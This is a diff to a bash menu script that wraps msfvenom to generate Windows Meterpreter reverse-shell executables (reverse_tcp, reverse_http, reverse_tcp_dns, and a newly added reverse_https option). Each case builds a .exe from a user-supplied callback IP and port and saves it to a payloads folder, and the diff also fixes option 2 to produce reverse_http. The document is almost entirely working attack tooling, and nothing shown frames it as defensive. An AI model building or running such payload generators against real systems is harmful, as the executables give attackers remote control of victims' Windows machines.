@@ -46,6 +46,7 @@ windows () {
     echo -e "${White}[1] ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        +"
     echo -e "+ ${White}[2] ${Purple}windows/meterpreter/reverse_http         ${Blue}         +"
     echo -e "+ ${White}[3] ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      +"
+    echo -e "+ ${White}[4] ${Purple}windows/meterpreter/reverse_https         ${Blue}        +"
     echo -e "${Blue}+-------------------------------------------------------+"
     sleep 0.3
     echo -ne "${Green}[#] Choose a payload: ${White}" 
@@ -66,8 +67,8 @@ windows () {
         echo
         echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
         echo
-        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
-        payload='windows/meterpreter/reverse_https' ;;
+        msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_http' ;;
 
         3)
         target
@@ -77,6 +78,14 @@ windows () {
         msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
         payload='windows/meterpreter/reverse_tcp_dns' ;;
 
+        4)
+        target
+        echo 
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_https' ;;
+    
         *)
         echo -e "${Cyan}[*] INVALID CHOICE!" 
        	sleep 1 
